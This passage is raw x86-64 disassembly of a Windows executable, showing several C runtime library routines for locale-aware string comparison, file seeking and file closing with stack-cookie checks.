   14000d1e3:	48 83 c4 40          	add    $0x40,%rsp
   14000d1e7:	5f                   	pop    %rdi
   14000d1e8:	c3                   	ret
   14000d1e9:	cc                   	int3
   14000d1ea:	cc                   	int3
   14000d1eb:	cc                   	int3
   14000d1ec:	40 55                	rex push %rbp
   14000d1ee:	53                   	push   %rbx
   14000d1ef:	56                   	push   %rsi
   14000d1f0:	57                   	push   %rdi
   14000d1f1:	41 54                	push   %r12
   14000d1f3:	41 55                	push   %r13
   14000d1f5:	41 56                	push   %r14
   14000d1f7:	41 57                	push   %r15
   14000d1f9:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   14000d200:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   14000d205:	48 8b 05 f4 cd 00 00 	mov    0xcdf4(%rip),%rax        # 0x14001a000
   14000d20c:	48 33 c5             	xor    %rbp,%rax
   14000d20f:	48 89 45 30          	mov    %rax,0x30(%rbp)
   14000d213:	48 63 bd b0 00 00 00 	movslq 0xb0(%rbp),%rdi
   14000d21a:	45 33 ed             	xor    %r13d,%r13d
   14000d21d:	4c 8b a5 b8 00 00 00 	mov    0xb8(%rbp),%r12
   14000d224:	4d 8b f1             	mov    %r9,%r14
   14000d227:	44 89 45 00          	mov    %r8d,0x0(%rbp)
   14000d22b:	48 8b d9             	mov    %rcx,%rbx
   14000d22e:	48 89 55 10          	mov    %rdx,0x10(%rbp)
   14000d232:	4c 89 65 08          	mov    %r12,0x8(%rbp)
   14000d236:	85 ff                	test   %edi,%edi
   14000d238:	7e 10                	jle    0x14000d24a
   14000d23a:	48 8b d7             	mov    %rdi,%rdx
   14000d23d:	49 8b c9             	mov    %r9,%rcx
   14000d240:	e8 43 fe ff ff       	call   0x14000d088
   14000d245:	48 8b f8             	mov    %rax,%rdi
   14000d248:	eb 09                	jmp    0x14000d253
   14000d24a:	83 ff ff             	cmp    $0xffffffff,%edi
   14000d24d:	0f 8c f6 02 00 00    	jl     0x14000d549
   14000d253:	48 63 b5 c0 00 00 00 	movslq 0xc0(%rbp),%rsi
   14000d25a:	85 f6                	test   %esi,%esi
   14000d25c:	7e 10                	jle    0x14000d26e
   14000d25e:	48 8b d6             	mov    %rsi,%rdx
   14000d261:	49 8b cc             	mov    %r12,%rcx
   14000d264:	e8 1f fe ff ff       	call   0x14000d088
   14000d269:	48 8b f0             	mov    %rax,%rsi
   14000d26c:	eb 09                	jmp    0x14000d277
   14000d26e:	83 fe ff             	cmp    $0xffffffff,%esi
   14000d271:	0f 8c d2 02 00 00    	jl     0x14000d549
   14000d277:	44 8b bd c8 00 00 00 	mov    0xc8(%rbp),%r15d
   14000d27e:	45 85 ff             	test   %r15d,%r15d
   14000d281:	75 07                	jne    0x14000d28a
   14000d283:	48 8b 03             	mov    (%rbx),%rax
   14000d286:	44 8b 78 0c          	mov    0xc(%rax),%r15d
   14000d28a:	85 ff                	test   %edi,%edi
   14000d28c:	74 08                	je     0x14000d296
   14000d28e:	85 f6                	test   %esi,%esi
   14000d290:	0f 85 a6 00 00 00    	jne    0x14000d33c
   14000d296:	3b fe                	cmp    %esi,%edi
   14000d298:	0f 84 ca 02 00 00    	je     0x14000d568
   14000d29e:	83 fe 01             	cmp    $0x1,%esi
   14000d2a1:	0f 8f 8b 00 00 00    	jg     0x14000d332
   14000d2a7:	83 ff 01             	cmp    $0x1,%edi
   14000d2aa:	7f 48                	jg     0x14000d2f4
   14000d2ac:	48 8d 55 18          	lea    0x18(%rbp),%rdx
   14000d2b0:	41 8b cf             	mov    %r15d,%ecx
   14000d2b3:	ff 15 17 2f 00 00    	call   *0x2f17(%rip)        # 0x1400101d0
   14000d2b9:	85 c0                	test   %eax,%eax
   14000d2bb:	0f 84 88 02 00 00    	je     0x14000d549
   14000d2c1:	85 ff                	test   %edi,%edi
   14000d2c3:	7e 39                	jle    0x14000d2fe
   14000d2c5:	83 7d 18 02          	cmpl   $0x2,0x18(%rbp)
   14000d2c9:	72 29                	jb     0x14000d2f4
   14000d2cb:	48 8d 45 1e          	lea    0x1e(%rbp),%rax
   14000d2cf:	44 38 6d 1e          	cmp    %r13b,0x1e(%rbp)
   14000d2d3:	74 1f                	je     0x14000d2f4
   14000d2d5:	44 38 68 01          	cmp    %r13b,0x1(%rax)
   14000d2d9:	74 19                	je     0x14000d2f4
   14000d2db:	41 8a 0e             	mov    (%r14),%cl
   14000d2de:	3a 08                	cmp    (%rax),%cl
   14000d2e0:	72 09                	jb     0x14000d2eb
   14000d2e2:	3a 48 01             	cmp    0x1(%rax),%cl
   14000d2e5:	0f 86 7d 02 00 00    	jbe    0x14000d568
   14000d2eb:	48 83 c0 02          	add    $0x2,%rax
   14000d2ef:	44 38 28             	cmp    %r13b,(%rax)
   14000d2f2:	75 e1                	jne    0x14000d2d5
   14000d2f4:	b8 03 00 00 00       	mov    $0x3,%eax
   14000d2f9:	e9 4d 02 00 00       	jmp    0x14000d54b
   14000d2fe:	85 f6                	test   %esi,%esi
   14000d300:	7e 3a                	jle    0x14000d33c
   14000d302:	83 7d 18 02          	cmpl   $0x2,0x18(%rbp)
   14000d306:	72 2a                	jb     0x14000d332
   14000d308:	48 8d 45 1e          	lea    0x1e(%rbp),%rax
   14000d30c:	44 38 6d 1e          	cmp    %r13b,0x1e(%rbp)
   14000d310:	74 20                	je     0x14000d332
   14000d312:	44 38 68 01          	cmp    %r13b,0x1(%rax)
   14000d316:	74 1a                	je     0x14000d332
   14000d318:	41 8a 0c 24          	mov    (%r12),%cl
   14000d31c:	3a 08                	cmp    (%rax),%cl
   14000d31e:	72 09                	jb     0x14000d329
   14000d320:	3a 48 01             	cmp    0x1(%rax),%cl
   14000d323:	0f 86 3f 02 00 00    	jbe    0x14000d568
   14000d329:	48 83 c0 02          	add    $0x2,%rax
   14000d32d:	44 38 28             	cmp    %r13b,(%rax)
   14000d330:	75 e0                	jne    0x14000d312
   14000d332:	b8 01 00 00 00       	mov    $0x1,%eax
   14000d337:	e9 0f 02 00 00       	jmp    0x14000d54b
   14000d33c:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   14000d341:	44 8b cf             	mov    %edi,%r9d
   14000d344:	4d 8b c6             	mov    %r14,%r8
   14000d347:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   14000d34c:	ba 09 00 00 00       	mov    $0x9,%edx
   14000d351:	41 8b cf             	mov    %r15d,%ecx
   14000d354:	e8 03 b2 ff ff       	call   0x14000855c
   14000d359:	4c 63 e8             	movslq %eax,%r13
   14000d35c:	85 c0                	test   %eax,%eax
   14000d35e:	0f 84 e5 01 00 00    	je     0x14000d549
   14000d364:	49 8b d5             	mov    %r13,%rdx
   14000d367:	48 03 d2             	add    %rdx,%rdx
   14000d36a:	48 8d 4a 10          	lea    0x10(%rdx),%rcx
   14000d36e:	48 3b d1             	cmp    %rcx,%rdx
   14000d371:	48 1b d2             	sbb    %rdx,%rdx
   14000d374:	48 23 d1             	and    %rcx,%rdx
   14000d377:	0f 84 cc 01 00 00    	je     0x14000d549
   14000d37d:	48 b9 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rcx
   14000d384:	ff ff 0f 
   14000d387:	48 81 fa 00 04 00 00 	cmp    $0x400,%rdx
   14000d38e:	77 2e                	ja     0x14000d3be
   14000d390:	48 8d 42 0f          	lea    0xf(%rdx),%rax
   14000d394:	48 3b c2             	cmp    %rdx,%rax
   14000d397:	77 03                	ja     0x14000d39c
   14000d399:	48 8b c1             	mov    %rcx,%rax
   14000d39c:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   14000d3a0:	e8 ab 19 00 00       	call   0x14000ed50
   14000d3a5:	48 2b e0             	sub    %rax,%rsp
   14000d3a8:	48 8d 5c 24 50       	lea    0x50(%rsp),%rbx
   14000d3ad:	48 85 db             	test   %rbx,%rbx
   14000d3b0:	0f 84 93 01 00 00    	je     0x14000d549
   14000d3b6:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   14000d3bc:	eb 16                	jmp    0x14000d3d4
   14000d3be:	48 8b ca             	mov    %rdx,%rcx
   14000d3c1:	e8 e2 c1 ff ff       	call   0x1400095a8
   14000d3c6:	48 8b d8             	mov    %rax,%rbx
   14000d3c9:	48 85 c0             	test   %rax,%rax
   14000d3cc:	74 0a                	je     0x14000d3d8
   14000d3ce:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   14000d3d4:	48 83 c3 10          	add    $0x10,%rbx
   14000d3d8:	48 85 db             	test   %rbx,%rbx
   14000d3db:	0f 84 68 01 00 00    	je     0x14000d549
   14000d3e1:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   14000d3e6:	44 8b cf             	mov    %edi,%r9d
   14000d3e9:	4d 8b c6             	mov    %r14,%r8
   14000d3ec:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000d3f1:	ba 01 00 00 00       	mov    $0x1,%edx
   14000d3f6:	41 8b cf             	mov    %r15d,%ecx
   14000d3f9:	e8 5e b1 ff ff       	call   0x14000855c
   14000d3fe:	85 c0                	test   %eax,%eax
   14000d400:	0f 84 32 01 00 00    	je     0x14000d538
   14000d406:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000d40b:	44 8b ce             	mov    %esi,%r9d
   14000d40e:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000d414:	4d 8b c4             	mov    %r12,%r8
   14000d417:	ba 09 00 00 00       	mov    $0x9,%edx
   14000d41c:	41 8b cf             	mov    %r15d,%ecx
   14000d41f:	e8 38 b1 ff ff       	call   0x14000855c
   14000d424:	4c 63 e0             	movslq %eax,%r12
   14000d427:	85 c0                	test   %eax,%eax
   14000d429:	0f 84 09 01 00 00    	je     0x14000d538
   14000d42f:	49 8b cc             	mov    %r12,%rcx
   14000d432:	48 03 c9             	add    %rcx,%rcx
   14000d435:	48 8d 41 10          	lea    0x10(%rcx),%rax
   14000d439:	48 3b c8             	cmp    %rax,%rcx
   14000d43c:	48 1b c9             	sbb    %rcx,%rcx
   14000d43f:	48 23 c8             	and    %rax,%rcx
   14000d442:	0f 84 f0 00 00 00    	je     0x14000d538
   14000d448:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   14000d44f:	77 35                	ja     0x14000d486
   14000d451:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   14000d455:	48 3b c1             	cmp    %rcx,%rax
   14000d458:	77 0a                	ja     0x14000d464
   14000d45a:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   14000d461:	ff ff 0f 
   14000d464:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   14000d468:	e8 e3 18 00 00       	call   0x14000ed50
   14000d46d:	48 2b e0             	sub    %rax,%rsp
   14000d470:	48 8d 7c 24 50       	lea    0x50(%rsp),%rdi
   14000d475:	48 85 ff             	test   %rdi,%rdi
   14000d478:	0f 84 ba 00 00 00    	je     0x14000d538
   14000d47e:	c7 07 cc cc 00 00    	movl   $0xcccc,(%rdi)
   14000d484:	eb 13                	jmp    0x14000d499
   14000d486:	e8 1d c1 ff ff       	call   0x1400095a8
   14000d48b:	48 8b f8             	mov    %rax,%rdi
   14000d48e:	48 85 c0             	test   %rax,%rax
   14000d491:	74 0a                	je     0x14000d49d
   14000d493:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   14000d499:	48 83 c7 10          	add    $0x10,%rdi
   14000d49d:	48 85 ff             	test   %rdi,%rdi
   14000d4a0:	0f 84 92 00 00 00    	je     0x14000d538
   14000d4a6:	4c 8b 45 08          	mov    0x8(%rbp),%r8
   14000d4aa:	4c 8d 77 f0          	lea    -0x10(%rdi),%r14
   14000d4ae:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   14000d4b3:	44 8b ce             	mov    %esi,%r9d
   14000d4b6:	ba 01 00 00 00       	mov    $0x1,%edx
   14000d4bb:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000d4c0:	41 8b cf             	mov    %r15d,%ecx
   14000d4c3:	e8 94 b0 ff ff       	call   0x14000855c
   14000d4c8:	33 c9                	xor    %ecx,%ecx
   14000d4ca:	85 c0                	test   %eax,%eax
   14000d4cc:	75 1a                	jne    0x14000d4e8
   14000d4ce:	bf dd dd 00 00       	mov    $0xdddd,%edi
   14000d4d3:	41 39 3e             	cmp    %edi,(%r14)
   14000d4d6:	75 08                	jne    0x14000d4e0
   14000d4d8:	49 8b ce             	mov    %r14,%rcx
   14000d4db:	e8 6c 97 ff ff       	call   0x140006c4c
   14000d4e0:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   14000d4e4:	39 39                	cmp    %edi,(%rcx)
   14000d4e6:	eb 5a                	jmp    0x14000d542
   14000d4e8:	8b 55 00             	mov    0x0(%rbp),%edx
   14000d4eb:	45 8b cd             	mov    %r13d,%r9d
   14000d4ee:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   14000d4f3:	4c 8b c3             	mov    %rbx,%r8
   14000d4f6:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   14000d4fb:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   14000d500:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000d504:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   14000d509:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000d50e:	e8 e9 c8 ff ff       	call   0x140009dfc
   14000d513:	be dd dd 00 00       	mov    $0xdddd,%esi
   14000d518:	8b f8                	mov    %eax,%edi
   14000d51a:	41 39 36             	cmp    %esi,(%r14)
   14000d51d:	75 08                	jne    0x14000d527
   14000d51f:	49 8b ce             	mov    %r14,%rcx
   14000d522:	e8 25 97 ff ff       	call   0x140006c4c
   14000d527:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   14000d52b:	39 31                	cmp    %esi,(%rcx)
   14000d52d:	75 05                	jne    0x14000d534
   14000d52f:	e8 18 97 ff ff       	call   0x140006c4c
   14000d534:	8b c7                	mov    %edi,%eax
   14000d536:	eb 13                	jmp    0x14000d54b
   14000d538:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   14000d53c:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000d542:	75 05                	jne    0x14000d549
   14000d544:	e8 03 97 ff ff       	call   0x140006c4c
   14000d549:	33 c0                	xor    %eax,%eax
   14000d54b:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   14000d54f:	48 33 cd             	xor    %rbp,%rcx
   14000d552:	e8 09 3e ff ff       	call   0x140001360
   14000d557:	48 8d 65 48          	lea    0x48(%rbp),%rsp
   14000d55b:	41 5f                	pop    %r15
   14000d55d:	41 5e                	pop    %r14
   14000d55f:	41 5d                	pop    %r13
   14000d561:	41 5c                	pop    %r12
   14000d563:	5f                   	pop    %rdi
   14000d564:	5e                   	pop    %rsi
   14000d565:	5b                   	pop    %rbx
   14000d566:	5d                   	pop    %rbp
   14000d567:	c3                   	ret
   14000d568:	b8 02 00 00 00       	mov    $0x2,%eax
   14000d56d:	eb dc                	jmp    0x14000d54b
   14000d56f:	cc                   	int3
   14000d570:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000d575:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000d57a:	57                   	push   %rdi
   14000d57b:	48 83 ec 60          	sub    $0x60,%rsp
   14000d57f:	48 8b f2             	mov    %rdx,%rsi
   14000d582:	49 8b d9             	mov    %r9,%rbx
   14000d585:	48 8b d1             	mov    %rcx,%rdx
   14000d588:	41 8b f8             	mov    %r8d,%edi
   14000d58b:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000d590:	e8 27 a1 ff ff       	call   0x1400076bc
   14000d595:	8b 84 24 a8 00 00 00 	mov    0xa8(%rsp),%eax
   14000d59c:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000d5a1:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000d5a5:	4c 8b cb             	mov    %rbx,%r9
   14000d5a8:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   14000d5af:	44 8b c7             	mov    %edi,%r8d
   14000d5b2:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000d5b6:	48 8b d6             	mov    %rsi,%rdx
   14000d5b9:	48 8b 84 24 98 00 00 	mov    0x98(%rsp),%rax
   14000d5c0:	00 
   14000d5c1:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000d5c6:	8b 84 24 90 00 00 00 	mov    0x90(%rsp),%eax
   14000d5cd:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000d5d1:	e8 16 fc ff ff       	call   0x14000d1ec
   14000d5d6:	80 7c 24 58 00       	cmpb   $0x0,0x58(%rsp)
   14000d5db:	74 0c                	je     0x14000d5e9
   14000d5dd:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   14000d5e2:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000d5e9:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   14000d5ee:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   14000d5f3:	48 83 c4 60          	add    $0x60,%rsp
   14000d5f7:	5f                   	pop    %rdi
   14000d5f8:	c3                   	ret
   14000d5f9:	cc                   	int3
   14000d5fa:	cc                   	int3
   14000d5fb:	cc                   	int3
   14000d5fc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000d601:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000d606:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000d60b:	57                   	push   %rdi
   14000d60c:	48 83 ec 30          	sub    $0x30,%rsp
   14000d610:	48 63 f9             	movslq %ecx,%rdi
   14000d613:	49 8b d9             	mov    %r9,%rbx
   14000d616:	8b cf                	mov    %edi,%ecx
   14000d618:	41 8b f0             	mov    %r8d,%esi
   14000d61b:	48 8b ea             	mov    %rdx,%rbp
   14000d61e:	e8 c9 b9 ff ff       	call   0x140008fec
   14000d623:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000d627:	75 11                	jne    0x14000d63a
   14000d629:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   14000d62d:	c7 43 2c 09 00 00 00 	movl   $0x9,0x2c(%rbx)
   14000d634:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000d638:	eb 56                	jmp    0x14000d690
   14000d63a:	44 8b ce             	mov    %esi,%r9d
   14000d63d:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   14000d642:	48 8b d5             	mov    %rbp,%rdx
   14000d645:	48 8b c8             	mov    %rax,%rcx
   14000d648:	ff 15 d2 29 00 00    	call   *0x29d2(%rip)        # 0x140010020
   14000d64e:	85 c0                	test   %eax,%eax
   14000d650:	75 12                	jne    0x14000d664
   14000d652:	ff 15 80 2a 00 00    	call   *0x2a80(%rip)        # 0x1400100d8
   14000d658:	8b c8                	mov    %eax,%ecx
   14000d65a:	48 8b d3             	mov    %rbx,%rdx
   14000d65d:	e8 0e 95 ff ff       	call   0x140006b70
   14000d662:	eb d0                	jmp    0x14000d634
   14000d664:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000d669:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000d66d:	74 c5                	je     0x14000d634
   14000d66f:	48 8b d7             	mov    %rdi,%rdx
   14000d672:	4c 8d 05 b7 df 00 00 	lea    0xdfb7(%rip),%r8        # 0x14001b630
   14000d679:	83 e2 3f             	and    $0x3f,%edx
   14000d67c:	48 8b cf             	mov    %rdi,%rcx
   14000d67f:	48 c1 f9 06          	sar    $0x6,%rcx
   14000d683:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000d687:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   14000d68b:	80 64 d1 38 fd       	andb   $0xfd,0x38(%rcx,%rdx,8)
   14000d690:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000d695:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   14000d69a:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000d69f:	48 83 c4 30          	add    $0x30,%rsp
   14000d6a3:	5f                   	pop    %rdi
   14000d6a4:	c3                   	ret
   14000d6a5:	cc                   	int3
   14000d6a6:	cc                   	int3
   14000d6a7:	cc                   	int3
   14000d6a8:	e9 4f ff ff ff       	jmp    0x14000d5fc
   14000d6ad:	cc                   	int3
   14000d6ae:	cc                   	int3
   14000d6af:	cc                   	int3
   14000d6b0:	66 89 4c 24 08       	mov    %cx,0x8(%rsp)
   14000d6b5:	48 83 ec 28          	sub    $0x28,%rsp
   14000d6b9:	e8 96 09 00 00       	call   0x14000e054
   14000d6be:	85 c0                	test   %eax,%eax
   14000d6c0:	74 1f                	je     0x14000d6e1
   14000d6c2:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   14000d6c7:	ba 01 00 00 00       	mov    $0x1,%edx
   14000d6cc:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000d6d1:	e8 ee 09 00 00       	call   0x14000e0c4
   14000d6d6:	85 c0                	test   %eax,%eax
   14000d6d8:	74 07                	je     0x14000d6e1
   14000d6da:	0f b7 44 24 30       	movzwl 0x30(%rsp),%eax
   14000d6df:	eb 05                	jmp    0x14000d6e6
   14000d6e1:	b8 ff ff 00 00       	mov    $0xffff,%eax
   14000d6e6:	48 83 c4 28          	add    $0x28,%rsp
   14000d6ea:	c3                   	ret
   14000d6eb:	cc                   	int3
   14000d6ec:	48 8b c4             	mov    %rsp,%rax
   14000d6ef:	48 89 58 10          	mov    %rbx,0x10(%rax)
   14000d6f3:	48 89 48 08          	mov    %rcx,0x8(%rax)
   14000d6f7:	57                   	push   %rdi
   14000d6f8:	48 83 ec 30          	sub    $0x30,%rsp
   14000d6fc:	48 8b fa             	mov    %rdx,%rdi
   14000d6ff:	48 8b d9             	mov    %rcx,%rbx
   14000d702:	48 85 c9             	test   %rcx,%rcx
   14000d705:	75 2e                	jne    0x14000d735
   14000d707:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   14000d70b:	c7 42 2c 16 00 00 00 	movl   $0x16,0x2c(%rdx)
   14000d712:	48 89 50 f0          	mov    %rdx,-0x10(%rax)
   14000d716:	48 21 48 e8          	and    %rcx,-0x18(%rax)
   14000d71a:	45 33 c9             	xor    %r9d,%r9d
   14000d71d:	45 33 c0             	xor    %r8d,%r8d
   14000d720:	33 d2                	xor    %edx,%edx
   14000d722:	e8 85 92 ff ff       	call   0x1400069ac
   14000d727:	83 c8 ff             	or     $0xffffffff,%eax
   14000d72a:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   14000d72f:	48 83 c4 30          	add    $0x30,%rsp
   14000d733:	5f                   	pop    %rdi
   14000d734:	c3                   	ret
   14000d735:	8b 41 14             	mov    0x14(%rcx),%eax
   14000d738:	90                   	nop
   14000d739:	c1 e8 0c             	shr    $0xc,%eax
   14000d73c:	24 01                	and    $0x1,%al
   14000d73e:	74 07                	je     0x14000d747
   14000d740:	e8 4b 0c 00 00       	call   0x14000e390
   14000d745:	eb e0                	jmp    0x14000d727
   14000d747:	e8 d4 d3 ff ff       	call   0x14000ab20
   14000d74c:	90                   	nop
   14000d74d:	48 8b d7             	mov    %rdi,%rdx
   14000d750:	48 8b cb             	mov    %rbx,%rcx
   14000d753:	e8 10 00 00 00       	call   0x14000d768
   14000d758:	8b f8                	mov    %eax,%edi
   14000d75a:	48 8b cb             	mov    %rbx,%rcx
   14000d75d:	e8 ca d3 ff ff       	call   0x14000ab2c
   14000d762:	8b c7                	mov    %edi,%eax
   14000d764:	eb c4                	jmp    0x14000d72a
   14000d766:	cc                   	int3
   14000d767:	cc                   	int3
   14000d768:	48 8b c4             	mov    %rsp,%rax
   14000d76b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000d76f:	48 89 70 10          	mov    %rsi,0x10(%rax)
   14000d773:	57                   	push   %rdi
   14000d774:	48 83 ec 30          	sub    $0x30,%rsp
   14000d778:	48 8b fa             	mov    %rdx,%rdi
   14000d77b:	48 8b d9             	mov    %rcx,%rbx
   14000d77e:	48 85 c9             	test   %rcx,%rcx
   14000d781:	75 25                	jne    0x14000d7a8
   14000d783:	48 89 50 f0          	mov    %rdx,-0x10(%rax)
   14000d787:	45 33 c9             	xor    %r9d,%r9d
   14000d78a:	48 21 48 e8          	and    %rcx,-0x18(%rax)
   14000d78e:	45 33 c0             	xor    %r8d,%r8d
   14000d791:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   14000d795:	c7 42 2c 16 00 00 00 	movl   $0x16,0x2c(%rdx)
   14000d79c:	33 d2                	xor    %edx,%edx
   14000d79e:	e8 09 92 ff ff       	call   0x1400069ac
   14000d7a3:	83 c8 ff             	or     $0xffffffff,%eax
   14000d7a6:	eb 55                	jmp    0x14000d7fd
   14000d7a8:	8b 41 14             	mov    0x14(%rcx),%eax
   14000d7ab:	83 ce ff             	or     $0xffffffff,%esi
   14000d7ae:	c1 e8 0d             	shr    $0xd,%eax
   14000d7b1:	90                   	nop
   14000d7b2:	a8 01                	test   $0x1,%al
   14000d7b4:	74 3d                	je     0x14000d7f3
   14000d7b6:	e8 81 d0 ff ff       	call   0x14000a83c
   14000d7bb:	48 8b cb             	mov    %rbx,%rcx
   14000d7be:	8b f0                	mov    %eax,%esi
   14000d7c0:	e8 37 f6 ff ff       	call   0x14000cdfc
   14000d7c5:	48 8b cb             	mov    %rbx,%rcx
   14000d7c8:	e8 bb d5 ff ff       	call   0x14000ad88
   14000d7cd:	8b c8                	mov    %eax,%ecx
   14000d7cf:	48 8b d7             	mov    %rdi,%rdx
   14000d7d2:	e8 25 0a 00 00       	call   0x14000e1fc
   14000d7d7:	85 c0                	test   %eax,%eax
   14000d7d9:	79 05                	jns    0x14000d7e0
   14000d7db:	83 ce ff             	or     $0xffffffff,%esi
   14000d7de:	eb 13                	jmp    0x14000d7f3
   14000d7e0:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   14000d7e4:	48 85 c9             	test   %rcx,%rcx
   14000d7e7:	74 0a                	je     0x14000d7f3
   14000d7e9:	e8 5e 94 ff ff       	call   0x140006c4c
   14000d7ee:	48 83 63 28 00       	andq   $0x0,0x28(%rbx)
   14000d7f3:	48 8b cb             	mov    %rbx,%rcx
   14000d7f6:	e8 95 0b 00 00       	call   0x14000e390
   14000d7fb:	8b c6                	mov    %esi,%eax
   14000d7fd:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000d802:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   14000d807:	48 83 c4 30          	add    $0x30,%rsp
   14000d80b:	5f                   	pop    %rdi
   14000d80c:	c3                   	ret
   14000d80d:	cc                   	int3
   14000d80e:	cc                   	int3
   14000d80f:	cc                   	int3
   14000d810:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000d815:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   14000d81a:	55                   	push   %rbp
   14000d81b:	48 8b ec             	mov    %rsp,%rbp
   14000d81e:	48 83 ec 60          	sub    $0x60,%rsp
   14000d822:	48 83 65 c0 00       	andq   $0x0,-0x40(%rbp)
   14000d827:	83 3d 52 db 00 00 00 	cmpl   $0x0,0xdb52(%rip)        # 0x14001b380
   14000d82e:	c6 45 d0 00          	movb   $0x0,-0x30(%rbp)
   14000d832:	c6 45 e8 00          	movb   $0x0,-0x18(%rbp)
   14000d836:	c6 45 f0 00          	movb   $0x0,-0x10(%rbp)
   14000d83a:	c6 45 f8 00          	movb   $0x0,-0x8(%rbp)
   14000d83e:	75 10                	jne    0x14000d850
   14000d840:	0f 10 05 f1 ce 00 00 	movups 0xcef1(%rip),%xmm0        # 0x14001a738
   14000d847:	c6 45 e8 01          	movb   $0x1,-0x18(%rbp)
   14000d84b:	f3 0f 7f 45 d8       	movdqu %xmm0,-0x28(%rbp)
   14000d850:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   14000d854:	e8 93 fe ff ff       	call   0x14000d6ec
   14000d859:	80 7d e8 02          	cmpb   $0x2,-0x18(%rbp)
   14000d85d:	8b f8                	mov    %eax,%edi
   14000d85f:	75 0b                	jne    0x14000d86c
   14000d861:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
   14000d865:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000d86c:	80 7d f0 00          	cmpb   $0x0,-0x10(%rbp)
   14000d870:	74 0f                	je     0x14000d881
   14000d872:	8b 5d ec             	mov    -0x14(%rbp),%ebx
   14000d875:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000d879:	e8 f2 85 ff ff       	call   0x140005e70
   14000d87e:	89 58 20             	mov    %ebx,0x20(%rax)
   14000d881:	80 7d f8 00          	cmpb   $0x0,-0x8(%rbp)
   14000d885:	74 0f                	je     0x14000d896
   14000d887:	8b 5d f4             	mov    -0xc(%rbp),%ebx
   14000d88a:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000d88e:	e8 dd 85 ff ff       	call   0x140005e70
   14000d893:	89 58 24             	mov    %ebx,0x24(%rax)
   14000d896:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   14000d89b:	8b c7                	mov    %edi,%eax
   14000d89d:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   14000d8a2:	48 83 c4 60          	add    $0x60,%rsp
   14000d8a6:	5d                   	pop    %rbp
   14000d8a7:	c3                   	ret
   14000d8a8:	cc                   	int3
   14000d8a9:	cc                   	int3
   14000d8aa:	cc                   	int3
   14000d8ab:	cc                   	int3
   14000d8ac:	cc                   	int3
   14000d8ad:	cc                   	int3
